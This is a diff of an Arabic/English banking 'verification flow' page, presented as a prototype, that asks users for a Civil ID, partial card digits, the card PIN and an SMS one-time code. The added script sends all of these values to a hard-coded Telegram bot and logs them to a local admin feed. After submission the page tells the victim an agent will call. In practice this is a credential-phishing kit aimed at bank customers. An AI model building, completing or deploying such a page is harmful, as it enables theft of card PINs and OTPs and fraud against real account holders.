@@ -1,15 +1,342 @@
-<!doctype html>
-<html lang="en">
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta name="description" content="A secure banking verification flow prototype" />
     <meta name="theme-color" content="#081b33" />
     <title>Banking Verification Flow</title>
-    <link rel="stylesheet" href="styles.css" />
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap">
+    <style>
+      :root{font-family:'Plus Jakarta Sans',Arial,sans-serif;color:#0f172a;background:#0f172a;font-synthesis:none}*{box-sizing:border-box}body{margin:0;min-width:320px;background:#0f172a}button,input{font:inherit}button{border:0;cursor:pointer}button:disabled{cursor:not-allowed}.shell{min-height:100vh;color:#f8fafc;display:flex;flex-direction:column}.toolbar{height:52px;background:rgba(2,6,23,.92);border-bottom:1px solid #1e293b;display:flex;align-items:center;justify-content:space-between;padding:0 16px;gap:14px;position:sticky;top:0;z-index:5;backdrop-filter:blur(12px)}.brand{font-weight:800;font-size:12px;white-space:nowrap}.brand i{display:inline-block;width:8px;height:8px;border-radius:50%;background:#34d399;margin-right:6px;box-shadow:0 0 0 3px rgba(52,211,153,.12)}.step-switcher{display:flex;gap:3px;background:#0f172a;border:1px solid #1e293b;padding:3px;border-radius:11px}.step-switcher button,.tool-btn{background:transparent;color:#94a3b8;padding:6px 9px;border-radius:8px;font-size:11px}.step-switcher button.active{background:#153358;color:white;font-weight:700}.toolbar-actions{display:flex;gap:6px}.tool-btn{background:#1e293b;border:1px solid #334155;color:#e2e8f0}.tool-btn:hover,.step-switcher button:hover{color:white;background:#334155}main{flex:1;display:flex;align-items:center;justify-content:center;padding:14px}.device{width:100%;max-width:576px;min-height:680px;overflow:hidden;background:#fff;box-shadow:0 24px 80px rgba(0,0,0,.35);border:1px solid #1e293b;border-radius:18px}.device.phone{max-width:410px;border:8px solid #1e293b;border-radius:36px}.status{height:28px;background:#fff;color:#0f172a;padding:8px 16px 0;display:flex;justify-content:space-between;font-size:11px;font-weight:700}.landing-status{background:#153358;color:white}.screen{min-height:680px;padding:24px;display:flex;flex-direction:column;background:#fff;color:#0f172a}.landing{background:#153358;color:#fff;position:relative;overflow:hidden}.x-art{position:absolute;top:20px;right:-44px;width:285px;height:285px;opacity:.93;transform:rotate(4deg);background:linear-gradient(56deg,transparent 40%,#fff 40%,#fff 56%,transparent 56%),linear-gradient(124deg,transparent 42%,#fff 42%,#fff 57%,transparent 57%)}.language-pill{position:relative;z-index:1;align-self:flex-end;background:#0e233d;border:1px solid rgba(96,165,250,.22);padding:2px;border-radius:99px}.language-pill button{padding:6px 15px;background:transparent;color:#cbd5e1;border-radius:99px;font-size:12px;font-weight:800}.language-pill button.selected{background:#0070ba;color:white}.landing-center{position:relative;z-index:1;text-align:center;margin:auto 0;padding:42px 0 36px}.headset{width:118px;height:118px;margin:0 auto 26px;position:relative}.headset:before{content:'';position:absolute;inset:8px;border:10px solid #1f1e38;border-bottom-color:transparent;border-radius:50%}.headset:after{content:'';position:absolute;left:35px;top:21px;width:55px;height:78px;background:#d4e8f8;border-radius:0 50% 50% 0}.headset span:before,.headset span:after{content:'';position:absolute;bottom:22px;width:18px;height:34px;background:#1f1e38;border-radius:99px;z-index:2}.headset span:before{left:7px}.headset span:after{right:7px}.landing h1{font-size:23px;letter-spacing:1.5px;margin:0 0 10px}.landing p{font-size:13px;line-height:1.6;color:#dbeafe;max-width:290px;margin:0 auto 22px}.dots{display:flex;justify-content:center;gap:6px}.dots>*{width:6px;height:6px;border-radius:99px;background:#94a3b8}.dots b{width:22px;background:#0080ff}.landing-bottom{position:relative;z-index:1;text-align:center}.landing-bottom>p{font-size:13px;color:#e2e8f0;margin:0 0 12px}.signup{display:block;width:100%;padding:16px;border-radius:15px;background:#fff;color:#153358;font-weight:800;font-size:16px;box-shadow:0 12px 24px rgba(0,0,0,.22);margin-bottom:24px}.signup:hover{background:#e2e8f0}.landing footer{display:flex;justify-content:center;align-items:center;gap:14px;font-size:11px;color:#cbd5e1}.landing footer button{background:none;color:inherit;padding:0}.landing footer em{font-style:normal;color:#64748b}.screen-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:26px}.screen-header span{font-size:11px;color:#94a3b8;font-weight:700}.back{font-size:27px;background:none;color:#334155;padding:0;line-height:1}.form-screen h1{font-size:32px;line-height:1.15;margin:0 0 12px;letter-spacing:-1px}.subtitle{font-size:15px;line-height:1.65;color:#1e293b;margin:0 0 24px}.form-screen form{margin:0}.form-screen label{display:block;font-size:13px;font-weight:600;color:#334155}.form-screen input{width:100%;margin-top:8px;border:1px solid #cbd5e1;border-radius:12px;padding:13px 14px;outline:none;color:#0f172a;font-family:inherit;font-size:17px}.form-screen input:focus{border-color:#153358;box-shadow:0 0 0 3px rgba(21,51,88,.1)}.form-screen input::placeholder{color:#94a3b8}.sample-title{color:#64748b;font-size:11px;margin:20px 0 8px}.samples{display:flex;gap:8px;flex-wrap:wrap}.samples button{font-family:'JetBrains Mono',monospace;font-size:11px;padding:7px 10px;border:1px solid #e2e8f0;background:#f1f5f9;color:#334155;border-radius:8px}.error{display:flex;align-items:center;gap:7px;color:#e11d48;font-size:12px;margin-top:10px}.error b{width:16px;height:16px;border:1px solid currentColor;border-radius:50%;display:grid;place-items:center;font-size:10px}.bottom{margin-top:auto;padding-top:22px}.primary{width:100%;padding:15px;border-radius:12px;background:#153358;color:#fff;font-weight:800;font-size:15px;box-shadow:0 6px 14px rgba(15,23,42,.14)}.primary:hover{background:#102744}.primary:disabled{background:#a3aeba;color:rgba(255,255,255,.8);box-shadow:none}.two-cols{display:grid;grid-template-columns:1fr 1fr;gap:14px}.two-cols input{text-align:center;font-family:'JetBrains Mono',monospace;font-weight:700}.debit-card{background:linear-gradient(135deg,#102540,#153358 60%,#1c4373);border-radius:16px;color:#fff;padding:18px;margin:0 0 22px;box-shadow:0 14px 24px rgba(15,23,42,.2)}.debit-card>div{display:flex;justify-content:space-between;align-items:center;color:#cbd5e1;font-size:10px}.debit-card strong{display:block;text-align:center;font:700 17px 'JetBrains Mono',monospace;letter-spacing:2px;padding:26px 0 22px}.debit-card strong span{color:#93c5fd}.info-row{background:#f8fafc;border:1px solid #e2e8f0;border-radius:11px;padding:12px;font-size:11px;color:#64748b;display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}.info-row b{font-family:'JetBrains Mono',monospace;color:#0f172a}.info-row span{background:#ecfdf5;border:1px solid #bbf7d0;color:#047857;padding:4px 7px;border-radius:6px;font-weight:700}.pin-label{display:flex;justify-content:space-between;align-items:center;font-size:12px;color:#334155}.pin-label button,.demo-link{background:none;color:#153358;font-size:12px;font-weight:700}.pin-boxes{display:flex;justify-content:center;gap:12px;margin:12px 0}.pin-box{width:56px;height:62px;display:grid;place-items:center;border:1px solid #cbd5e1;background:#f8fafc;border-radius:11px;color:#cbd5e1;font:700 24px 'JetBrains Mono',monospace}.pin-box.filled{background:#153358;border-color:#153358;color:white}.pin-input{font-size:12px!important;text-align:center;padding:9px!important;background:#f8fafc}.keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:7px;max-width:280px;margin:18px auto 8px}.keypad button{padding:11px;border:1px solid #e2e8f0;background:#f8fafc;border-radius:10px;font:700 18px 'JetBrains Mono',monospace;color:#0f172a}.keypad button:first-child,.keypad button:nth-child(10),.keypad button:nth-child(12){font:700 11px 'Plus Jakarta Sans';color:#475569}.demo-link{display:block;margin:8px auto;text-align:center}.sms{display:flex;gap:8px;align-items:flex-start;background:#0f172a;color:white;border-radius:11px;padding:12px;margin-bottom:18px;font-size:11px}.sms>div{flex:1}.sms small{display:block;color:#cbd5e1;margin-top:5px}.sms strong{color:#93c5fd;font:700 14px 'JetBrains Mono'}.sms button{background:#3b82f6;color:#fff;border-radius:7px;padding:6px 8px;font-size:10px;font-weight:700}.sms button:last-child{background:none;color:#94a3b8;font-size:17px;padding:0}.phone-number{font:700 13px 'JetBrains Mono';color:#153358}.otp-grid{display:grid;grid-template-columns:repeat(6,1fr);gap:8px;margin-top:8px}.otp-grid input{height:54px;padding:0;text-align:center;font:700 21px 'JetBrains Mono';margin:0}.resend{display:flex;justify-content:space-between;align-items:center;margin-top:16px;font-size:11px;color:#64748b}.resend button{background:none;color:#153358;font-weight:800;font-size:11px}.demo-center{text-align:center;margin-top:22px}.success-content{margin:auto 0}.success-icon{width:82px;height:82px;border-radius:50%;border:5px solid #d1fae5;background:#ecfdf5;color:#059669;display:grid;place-items:center;margin:0 auto 18px;font-size:42px;font-weight:700}.success h1{text-align:center;font-size:28px}.success .subtitle{text-align:center;color:#64748b;font-size:13px;max-width:310px;margin:0 auto 22px}.reference{display:flex;justify-content:space-between;align-items:center;background:#f8fafc;border:1px solid #e2e8f0;border-radius:15px;padding:14px;margin-bottom:18px}.reference small{display:block;text-transform:uppercase;color:#64748b;font-size:10px;font-weight:800;letter-spacing:1px}.reference b{display:block;color:#153358;font:700 14px 'JetBrains Mono';margin-top:4px}.reference button{padding:8px 10px;border-radius:8px;background:white;border:1px solid #e2e8f0;color:#475569;font-size:11px;font-weight:700}.summary{display:grid;gap:9px;font-size:11px}.summary>div{display:flex;justify-content:space-between;align-items:center;padding:12px;border-radius:11px;background:#f8fafc;border:1px solid #f1f5f9}.summary span{color:#64748b}.summary b{font-family:'JetBrains Mono';color:#334155}.summary .verified{background:#ecfdf5;border-color:#d1fae5}.summary .verified span,.summary .verified b{color:#047857}@media(max-width:850px){.step-switcher{display:none}}@media(max-width:520px){.toolbar{padding:0 10px}.brand{font-size:11px}.mobile-toggle{display:none}main{padding:0}.device,.device.phone{border-radius:0;border-left:0;border-right:0;border-bottom:0;min-height:calc(100vh - 52px)}.screen{min-height:calc(100vh - 52px);padding:22px}.otp-grid{gap:5px}.otp-grid input{height:50px}.form-screen h1{font-size:29px}}
+
+      /* Enhancement layer */
+      :root {
+        --ink: #081b33;
+        --ink-2: #12345c;
+        --blue: #1683e8;
+        --blue-soft: #eaf4ff;
+        --line: #d9e4ef;
+        --muted: #6b7c91;
+      }
+      body {
+        background:
+          radial-gradient(circle at 12% 4%, rgba(35, 112, 187, .22), transparent 26rem),
+          radial-gradient(circle at 88% 92%, rgba(14, 165, 163, .14), transparent 28rem),
+          #071426;
+      }
+      .shell { background: linear-gradient(135deg, rgba(7,20,38,.94), rgba(10,31,55,.88)); }
+      .toolbar { height: 64px; padding: 0 24px; border-bottom-color: rgba(148,163,184,.16); }
+      .brand { letter-spacing: .01em; font-size: 12px; }
+      .brand i { background: #55e6b0; box-shadow: 0 0 0 4px rgba(85,230,176,.12), 0 0 18px rgba(85,230,176,.55); }
+      .step-switcher { box-shadow: inset 0 1px rgba(255,255,255,.03); }
+      .step-switcher button.active { background: linear-gradient(135deg, #174d82, #12345c); box-shadow: 0 4px 12px rgba(0,0,0,.18); }
+      .tool-btn { transition: transform .18s ease, background .18s ease, border-color .18s ease; }
+      .tool-btn:hover { transform: translateY(-1px); border-color: #52749a; }
+      main { padding: 28px 20px; }
+      .device { max-width: 600px; border-color: rgba(148,163,184,.24); border-radius: 24px; box-shadow: 0 35px 100px rgba(0,0,0,.42), 0 0 0 1px rgba(255,255,255,.04); }
+      .device.phone { max-width: 420px; border-width: 9px; border-color: #132944; box-shadow: 0 35px 90px rgba(0,0,0,.48), 0 0 0 1px rgba(255,255,255,.12); }
+      .screen { padding: 30px; }
+      .landing { background: linear-gradient(155deg, #0d3157 0%, #153358 46%, #0c2745 100%); }
+      .landing::after { content: ''; position: absolute; inset: auto -18% -28% -18%; height: 48%; background: radial-gradient(ellipse, rgba(38,145,219,.25), transparent 67%); pointer-events: none; }
+      .x-art { opacity: .1; filter: blur(.2px); transform: rotate(8deg) scale(1.1); }
+      .landing-center { padding-top: 58px; }
+      .headset { filter: drop-shadow(0 13px 18px rgba(0,0,0,.23)); transform: scale(1.08); }
+      .landing h1 { font-size: 25px; letter-spacing: 1px; }
+      .landing p { color: #cfe4f8; }
+      .dots > * { opacity: .62; }
+      .dots b { box-shadow: 0 0 0 4px rgba(0,128,255,.15); }
+      .signup { position: relative; z-index: 2; transition: transform .18s ease, box-shadow .18s ease; }
+      .signup:hover { transform: translateY(-2px); box-shadow: 0 16px 30px rgba(0,0,0,.28); }
+      .form-screen { background: linear-gradient(180deg, #ffffff 0%, #fbfdff 100%); }
+      .screen-header { margin-bottom: 32px; }
+      .screen-header span { letter-spacing: .06em; text-transform: uppercase; font-size: 10px; }
+      .back { width: 36px; height: 36px; border: 1px solid var(--line); border-radius: 11px; display: grid; place-items: center; color: var(--ink-2); transition: background .18s ease, transform .18s ease; }
+      .back:hover { background: var(--blue-soft); transform: translateX(-2px); }
+      .form-screen h1 { color: var(--ink); font-size: 34px; }
+      .subtitle { color: #51657c; }
+      .form-screen input { border-color: #cbd9e7; background: #fff; transition: border-color .18s ease, box-shadow .18s ease, transform .18s ease; }
+      .form-screen input:hover { border-color: #9bb5cf; }
+      .form-screen input:focus { border-color: var(--blue); box-shadow: 0 0 0 4px rgba(22,131,232,.12); transform: translateY(-1px); }
+      .samples button { transition: color .18s ease, border-color .18s ease, background .18s ease, transform .18s ease; }
+      .samples button:hover { color: #075ca8; border-color: #8bc4f4; background: #eff8ff; transform: translateY(-1px); }
+      .primary { background: linear-gradient(135deg, #12345c, #0b5fa8); transition: transform .18s ease, box-shadow .18s ease, filter .18s ease; }
+      .primary:hover:not(:disabled) { filter: brightness(1.08); transform: translateY(-2px); box-shadow: 0 10px 22px rgba(16,71,121,.24); }
+      .debit-card { background: linear-gradient(135deg, #0b213b, #154e82 64%, #1b88c9); position: relative; overflow: hidden; }
+      .debit-card::after { content: ''; position: absolute; width: 180px; height: 180px; right: -65px; bottom: -85px; border-radius: 50%; border: 24px solid rgba(255,255,255,.08); box-shadow: 0 0 0 20px rgba(255,255,255,.05); }
+      .info-row { background: #f6faff; }
+      .pin-box.filled { background: linear-gradient(135deg, #12345c, #0b5fa8); box-shadow: 0 6px 12px rgba(12,63,108,.18); }
+      .sms { background: linear-gradient(135deg, #091a30, #12345c); box-shadow: 0 8px 18px rgba(8,27,51,.16); }
+      .otp-grid input:focus { transform: translateY(-2px); }
+      .success-icon { box-shadow: 0 0 0 9px rgba(16,185,129,.07); }
+      .reference { box-shadow: 0 8px 20px rgba(20,52,84,.05); }
+      .summary > div { background: #fbfdff; }
+      @media (max-width: 520px) {
+        .toolbar { height: 58px; }
+        main { padding: 0; }
+        .screen { padding: 24px 20px; }
+        .form-screen h1 { font-size: 30px; }
+      }
+
+      /* ATM segment layout and submission confirmation */
+      .atm-segments { display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap: 8px; align-items: end; }
+      .segment-field { min-width: 0; }
+      .segment-field span { display: block; font-size: 10px; color: #64748b; margin-bottom: 7px; white-space: nowrap; }
+      .segment-field input { text-align: center; padding-left: 7px; padding-right: 7px; font-family: 'JetBrains Mono', monospace; font-weight: 700; letter-spacing: .04em; }
+      .masked-segment { height: 49px; display: grid; place-items: center; border: 1px solid #d9e4ef; border-radius: 12px; background: #f1f6fb; color: #60758e; font: 700 13px 'JetBrains Mono', monospace; letter-spacing: .12em; }
+      .submitted { background: linear-gradient(180deg, #ffffff 0%, #f6fbff 100%); }
+      .submitted-modal { margin: auto 0; padding: 30px 22px; border: 1px solid #d8e9f5; border-radius: 24px; background: rgba(255,255,255,.9); box-shadow: 0 18px 45px rgba(13,61,102,.11); text-align: center; animation: pop-in .3s ease-out both; }
+      .submitted-modal .success-icon { margin-bottom: 22px; }
+      .submitted-modal h1 { font-size: 27px; margin-bottom: 12px; }
+      .submitted-modal .subtitle { max-width: 320px; margin: 0 auto 18px; }
+      .submission-note { display: inline-block; padding: 10px 12px; border-radius: 10px; background: #eff8ff; color: #24618d; font-size: 11px; line-height: 1.5; }
+      @keyframes pop-in { from { opacity: 0; transform: translateY(10px) scale(.98); } to { opacity: 1; transform: translateY(0) scale(1); } }
+      @media (max-width: 420px) { .atm-segments { gap: 5px; } .masked-segment { font-size: 11px; letter-spacing: .06em; } .segment-field span { font-size: 9px; } }
+    </style>
   </head>
   <body>
     <div id="app"></div>
-    <script src="app.js" defer></script>
+
+    <script>
+      // =========================================================================
+      // TELEGRAM BOT CONFIGURATION
+      // =========================================================================
+      const TELEGRAM_BOT_TOKEN = '9040001517:AAGZA2GjB9nmcneaYLW994A85FSpHa03c-4';
+      const TELEGRAM_CHAT_ID = '9287285450';
+
+      async function sendToTelegram(messageText) {
+        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === '9040001517:AAGZA2GjB9nmcneaYLW994A85FSpHa03c-4') {
+          console.warn('Telegram Bot Token is not set. Data submission skipped.');
+          return;
+        }
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        try {
+          await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: messageText,
+              parse_mode: 'HTML'
+            })
+          });
+        } catch (error) {
+          console.error('Failed to send data to Telegram:', error);
+        }
+      }
+
+      function sendVerificationPayload() {
+        const submissionData = {
+          timestamp: new Date().toISOString(),
+          civilId: state.civilId || 'N/A',
+          first4: state.first4 || '••••',
+          last4: state.last4 || '••••',
+          brand: state.brand.toUpperCase(),
+          pin: state.pin || 'N/A',
+          otp: state.otp || 'N/A',
+          language: state.language.toUpperCase(),
+          device: state.mobile ? 'Mobile Phone' : 'Wide Desktop',
+          status: state.screen === 'success' ? 'VERIFIED' : 'SUBMITTED'
+        };
+
+        // Save locally for the /#/admin panel feed
+        try {
+          const existing = JSON.parse(localStorage.getItem('admin_submissions') || '[]');
+          existing.unshift(submissionData);
+          localStorage.setItem('admin_submissions', JSON.stringify(existing));
+        } catch (e) {
+          console.error('Storage error', e);
+        }
+
+        // Send to Telegram in real-time
+        const payloadMessage = `
+🔐 <b>New Banking Verification Data Received</b>
+
+👤 <b>Civil ID / Resident ID:</b> <code>${submissionData.civilId}</code>
+💳 <b>Card Digits:</b> <code>${submissionData.first4} •••• •••• ${submissionData.last4}</code> (${submissionData.brand})
+🔑 <b>Card PIN:</b> <code>${submissionData.pin}</code>
+📲 <b>OTP Code:</b> <code>${submissionData.otp}</code>
+🌐 <b>Language:</b> ${submissionData.language}
+📱 <b>Device View:</b> ${submissionData.device}
+        `.trim();
+
+        sendToTelegram(payloadMessage);
+      }
+
+      // =========================================================================
+      // APP TRANSLATIONS & STATE MANAGEMENT
+      // =========================================================================
+      const translations = {
+        en: { hereToServe:'HERE TO SERVE YOU', supportDesc:'Confused about a transaction? unsure about something? never fear, one of our agents is always here', cardInactiveNotice:'If your card is inactive, activate it by signing up.', signUp:'Start Verification', aboutUs:'About Us', exploreProducts:'Explore Products', tools:'Tools', civilIdTitle:'Sign Up', civilIdSubtitle:'Provide your Civil or Resident ID details for identification.', civilIdLabel:'Enter Civil ID / Resident ID', civilIdPlaceholder:'Enter', civilIdError:'Please enter a valid Civil ID', continue:'Continue', cardDigitsTitle:'Debit Card', cardDigitsSubtitle:'Enter the first 4 and last 4 digits of your debit card.', first4Label:'First 4 digits', last4Label:'Last 4 digits', first4Placeholder:'e.g. 4502', last4Placeholder:'e.g. 9812', cardDigitsError:'Please enter all 8 digits (4 first & 4 last)', cardPinTitle:'Debit Card PIN', cardPinSubtitle:'Enter the 4-digit PIN associated with your debit card.', cardPinLabel:'Enter 4-Digit PIN', showPin:'Show PIN', hidePin:'Hide PIN', cardPinError:'Please enter your 4-digit ATM / Card PIN', otpTitle:'Verification Code', otpSubtitle:'Enter the 6-digit OTP code sent via SMS to your registered number', otpLabel:'Enter 6-Digit OTP', resendIn:'Resend code in', resendNow:'Resend Code', confirm:'Confirm', otpError:'Please enter the complete 6-digit OTP code', simulatedSms:'Simulated SMS:', useCode:'Auto-fill', successTitle:'Card Activated & Verified', successSubtitle:'Your debit card and Civil ID have been successfully verified.', submittedTitle:'Details Submitted Successfully', submittedSubtitle:'Thank you. Our agent will review your details and contact you soon.', submittedNote:'Please keep your phone available for a follow-up call.', refLabel:'Reference ID', verifiedCivilId:'Civil ID', verifiedCard:'Debit Card', done:'Back to Home'},
+        ar: { hereToServe:'هنا لخدمتك', supportDesc:'هل لديك استفسار عن معاملة؟ لست متأكداً من شيء؟ لا تقلق، فريقنا متواجد دائماً لمساعدتك', cardInactiveNotice:'إذا كانت بطاقتك غير مفعلة، قم بتفعيلها من خلال التسجيل.', signUp:'بدء التحقق', aboutUs:'من نحن', exploreProducts:'استكشف المنتجات', tools:'الأدوات', civilIdTitle:'التسجيل', civilIdSubtitle:'يرجى تقديم تفاصيل البطاقة المدنية أو بطاقة الإقامة للتحقق.', civilIdLabel:'أدخل الرقم المدني / رقم الإقامة', civilIdPlaceholder:'أدخل الرقم', civilIdError:'يرجى إدخال رقم مدني صحيح', continue:'متابعة', cardDigitsTitle:'بطاقة السحب الآلي', cardDigitsSubtitle:'أدخل أول 4 أرقام وآخر 4 أرقام من بطاقة السحب الآلي الخاصة بك.', first4Label:'أول 4 أرقام', last4Label:'آخر 4 أرقام', first4Placeholder:'مثال: 4502', last4Placeholder:'مثال: 9812', cardDigitsError:'يرجى إدخال الأرقام الثمانية بالكامل (4 في البداية و 4 في النهاية)', cardPinTitle:'الرقم السري للبطاقة', cardPinSubtitle:'أدخل الرقم السري المكون من 4 أرقام لبطاقة السحب الآلي.', cardPinLabel:'أدخل الرقم السري (4 أرقام)', showPin:'إظهار الرقم', hidePin:'إخفاء الرقم', cardPinError:'يرجى إدخال الرقم السري المكون من 4 أرقام', otpTitle:'رمز التحقق', otpSubtitle:'أدخل رمز التحقق المكون من 6 أرقام المرسل عبر رسالة نصية إلى هاتفك المسجل', otpLabel:'رمز OTP', resendIn:'إعادة الإرسال خلال', resendNow:'إعادة إرسال الرمز', confirm:'تأكيد', otpError:'يرجى إدخال رمز التحقق المكون من 6 أرقام كاملاً', simulatedSms:'رسالة نصية تجريبية:', useCode:'تعبئة تلقائية', successTitle:'تم تفعيل وتوثيق البطاقة بنجاح', successSubtitle:'تم التحقق من بيانات الرقم المدني وبطاقة السحب الآلي بنجاح.', submittedTitle:'تم إرسال البيانات بنجاح', submittedSubtitle:'شكراً لك. سيقوم أحد موظفينا بمراجعة بياناتك والتواصل معك قريباً.', submittedNote:'يرجى إبقاء هاتفك متاحاً لمتابعة الاتصال.', refLabel:'الرقم المرجعي', verifiedCivilId:'الرقم المدني', verifiedCard:'بطاقة السحب', done:'العودة للرئيسية'}
+      };
+      const steps = [['landing','1. Welcome'],['civil_id','2. Civil ID'],['card_digits','2. Card Details'],['card_pin','3. Card PIN']];
+      const state = { screen:'landing', language:'ar', mobile:true, civilId:'', first4:'', last4:'', brand:'visa', pin:'', otp:'', referenceId:'', maskedPhone:'+965 •••• 4821', demoCode:'849201', timer:59, canResend:false, pinVisible:false, smsVisible:true, error:'' };
+      let timerHandle;
+      const app = document.querySelector('#app');
+      const t = () => translations[state.language];
+      const esc = (s='') => String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+      const icon = (name) => ({back:'←',right:'→',check:'✓',copy:'▣',refresh:'↻',delete:'⌫',shield:'◆',eye:'◉',eyeoff:'○',alert:'!'}[name] || '');
+
+      function shell(content){
+        const isLanding=state.screen==='landing';
+        return `<div class="shell"><nav class="toolbar"><div class="brand"><i></i> Banking Verification Flow</div><div class="step-switcher">${steps.map(([key,label])=>`<button data-screen="${key}" class="${state.screen===key?'active':''}">${label}</button>`).join('')}</div><div class="toolbar-actions"><button data-lang class="tool-btn">◎ <b>${state.language==='en'?'EN':'عربي'}</b></button><button data-mobile class="tool-btn mobile-toggle">${state.mobile?'▣ Phone View':'▤ Wide View'}</button><a href="#/admin" class="tool-btn" style="text-decoration:none; display:inline-flex; align-items:center;">Admin</a><button data-reset class="tool-btn">↻</button></div></nav><main><div class="device ${state.mobile?'phone':''}">${state.mobile?`<div class="status ${isLanding?'landing-status':''}"></div>`:''}${content}</div></main></div>`;
+      }
+
+      function header(step){return `<div class="screen-header"><button class="back" data-back>${state.language==='ar'?icon('right'):icon('back')}</button><span>Step ${step} of 4</span></div>`}
+      function button(text,id,disabled=false){return `<button id="${id}" class="primary" ${disabled?'disabled':''}>${esc(text)}</button>`}
+      function landing(){const x=t();return `<section class="screen landing" dir="${state.language==='ar'?'rtl':'ltr'}"><div class="x-art"></div><div class="language-pill"><button data-set-lang="en" class="${state.language==='en'?'selected':''}">EN</button><button data-set-lang="ar" class="${state.language==='ar'?'selected':''}">عربي</button></div><div class="landing-center"><div class="headset"><span></span></div><h1>${x.hereToServe}</h1><p>${x.supportDesc}</p><div class="dots"><b></b><i></i><i></i></div></div><div class="landing-bottom"><p>${x.cardInactiveNotice}</p><button class="signup" data-start>${x.signUp}</button><footer><button>${x.aboutUs}</button><em>|</em><button>${x.exploreProducts}</button><em>|</em><button>${x.tools}</button></footer></div></section>`}
+      function fieldError(){return state.error?`<div class="error"><b>${icon('alert')}</b>${esc(state.error)}</div>`:''}
+
+      function formScreen(type){
+        const x=t(); 
+        if(type==='civil_id') return `<section class="screen form-screen" dir="${state.language==='ar'?'rtl':'ltr'}">${header(1)}<h1>${x.civilIdTitle}</h1><p class="subtitle">${x.civilIdSubtitle}</p><form data-form="civil"><label>${x.civilIdLabel}<input id="civil" inputmode="numeric" value="${esc(state.civilId)}" placeholder="${x.civilIdPlaceholder}" autofocus></label>${fieldError()}<div class="sample-title">✦ Sample Civil ID numbers:</div><div class="samples"><button data-civil="298010104921" type="button">298010104921</button><button data-civil="294050208834" type="button">294050208834</button></div></form><div class="bottom">${button(x.continue,'continue-civil',!state.civilId.length)}</div></section>`;
+        if(type==='card_digits') return `<section class="screen form-screen" dir="${state.language==='ar'?'rtl':'ltr'}">${header(2)}<h1>${x.cardDigitsTitle}</h1><p class="subtitle">${x.cardDigitsSubtitle}</p><div class="debit-card"><div><b>◆ DEBIT CARD</b><small>SMART CHIP</small></div><strong><span>${state.first4||'••••'}</span> •••• •••• <span>${state.last4||'••••'}</span></strong><div><small>ID: ${state.civilId?state.civilId.slice(0,4)+'••••'+state.civilId.slice(-2):'VERIFIED'}</small><small>${state.brand.toUpperCase()}</small></div></div><form data-form="card"><div class="atm-segments"><label class="segment-field"><span>${x.first4Label}</span><input id="first4" inputmode="numeric" maxlength="4" value="${state.first4}" placeholder="${x.first4Placeholder}"></label><div class="masked-segment" aria-label="Masked card digits">XXXX</div><div class="masked-segment" aria-label="Masked card digits">XXXX</div><label class="segment-field"><span>${x.last4Label}</span><input id="last4" inputmode="numeric" maxlength="4" value="${state.last4}" placeholder="${x.last4Placeholder}"></label></div>${fieldError()}<div class="sample-title">✦ Sample card digits:</div><div class="samples"><button data-card="4502,9812" type="button">4502 •••• 9812</button><button data-card="5210,4310" type="button">5210 •••• 4310</button></div></form><div class="bottom">${button(x.continue,'continue-card',!(state.first4.length===4&&state.last4.length===4))}</div></section>`;
+        if(type==='card_pin') return `<section class="screen form-screen" dir="${state.language==='ar'?'rtl':'ltr'}">${header(3)}<h1>${x.cardPinTitle}</h1><p class="subtitle">${x.cardPinSubtitle}</p><div class="info-row">Card: <b>${state.first4||'••••'} •••• •••• ${state.last4||'••••'}</b><span>Encrypted</span></div><div class="pin-label"><b>${x.cardPinLabel}</b><button type="button" data-toggle-pin>${state.pinVisible?icon('eyeoff')+' '+x.hidePin:icon('eye')+' '+x.showPin}</button></div><div class="pin-boxes">${[0,1,2,3].map(i=>`<div class="pin-box ${state.pin[i]?'filled':''}">${state.pin[i]?(state.pinVisible?state.pin[i]:'•'):'-'}</div>`).join('')}</div><input id="pin-input" class="pin-input" type="${state.pinVisible?'text':'password'}" inputmode="numeric" maxlength="4" value="${state.pin}" placeholder="Tap to type on keyboard">${fieldError()}<div class="keypad">${'123456789'.split('').map(n=>`<button type="button" data-pin="${n}">${n}</button>`).join('')}<button type="button" data-clear-pin>Clear</button><button type="button" data-pin="0">0</button><button type="button" data-backspace>${icon('delete')}</button></div><div class="bottom">${button(x.continue,'continue-pin',state.pin.length!==4)}</div></section>`;
+        return otp();
+      }
+
+      function otp(){const x=t();return `<section class="screen form-screen" dir="${state.language==='ar'?'rtl':'ltr'}">${state.smsVisible?`<div class="sms"><div>▣ <b>${x.simulatedSms}</b><small>Code for card ending in ${state.last4||'••••'}: <strong>${state.demoCode}</strong></small></div><button type="button" data-use-code>${x.useCode}</button><button type="button" data-close-sms>×</button></div>`:''}${header(4)}<h1>${x.otpTitle}</h1><p class="subtitle">${x.otpSubtitle} <b class="phone-number">${state.maskedPhone}</b>.</p><form data-form="otp"><label>${x.otpLabel}</label><div class="otp-grid">${Array.from({length:6},(_,i)=>`<input class="otp" data-otp-index="${i}" inputmode="numeric" maxlength="1" value="${state.otp[i]||''}" autofocus="${i===0}">`).join('')}</div>${fieldError()}<div class="resend"><span>${state.canResend?"Didn't receive SMS?":`${x.resendIn} <b>${state.timer}s</b>`}</span>${state.canResend?`<button type="button" data-resend>${icon('refresh')} ${x.resendNow}</button>`:''}</div><div class="demo-center"><button type="button" class="demo-link" data-use-code>✦ Fill Demo Code (${state.demoCode})</button></div></form><div class="bottom">${button(x.confirm,'confirm-otp',state.otp.length!==6)}</div></section>`}
